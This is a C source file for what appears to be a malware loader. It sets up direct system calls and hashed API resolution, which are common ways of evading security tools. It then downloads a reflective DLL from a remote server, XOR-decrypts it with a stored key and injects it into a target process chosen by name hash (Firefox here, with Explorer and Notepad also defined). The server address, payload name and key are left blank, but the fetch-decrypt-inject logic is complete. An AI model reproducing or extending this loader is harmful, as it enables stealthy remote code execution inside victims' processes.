# include "../Include/Utils.h"
# include "../Include/hashycalls.h"
# include "../Include/hellshall.h"


# define EXPLORER_EXE	0xA95E0A52
# define NOTEPAD_EXE	0x02C24B6C
# define FIREFOX 		0xF6F01BF4

# define SERVER 		""

# define USE_ENCRYPTION

# ifdef USE_ENCRYPTION
# define DLL 			""
# endif

# ifndef USE_ENCRYPTION
# define DLL 			""
# endif

int main() {

	DWORD	DllSize		= 0;
	PBYTE	DllBuffer	= 0;

#ifdef USE_ENCRYPTION
	PBYTE	DecryptedKey	= 0;
	BYTE	HintByte		= 0x00;

	char 	Key[] 			= { 0x00 };
#endif

	/* Initialize system call functions & resolve api hashes to function addresses */
	if (!InitApiCalls() || !InitializeSystemCalls())
		return -1;

	dbg("Initialized system calls & resolved api hashes");

	/* Download the reflective dll from a remote server */
	if ((DllBuffer = DownloadData("http://" SERVER "/" DLL, &DllSize)) == 0) {

		dbg("Could not download payload.");
		return -1;
	}
	dbg("Downloaded payload from server. Size: %d, address: %p. Press enter to continue.", DllSize, DllBuffer);

#ifdef USE_ENCRYPTION
	/* Decrypt the DLL */
	if (!(DecryptedKey = DecryptKey(HintByte, Key, sizeof(Key)))) {
		dbg("Failed to decrypt key");
		return -1;
	}
	dbg("Decrypted encryption key.");
	Xor(DllBuffer, (SIZE_T)DllSize, DecryptedKey, sizeof(Key));

	dbg("Decrypted reflective dll. Press enter to continue.");
	wait();
#endif

	/* Inject the dll to the target process */
	if (!InjectDll(FIREFOX, DllBuffer, DllSize)) {
		dbg("Could not inject reflective dll.");
		return -1;
	}
	dbg("Injected reflective dll to target process. Press enter to quit");
	wait();

	return  0;
}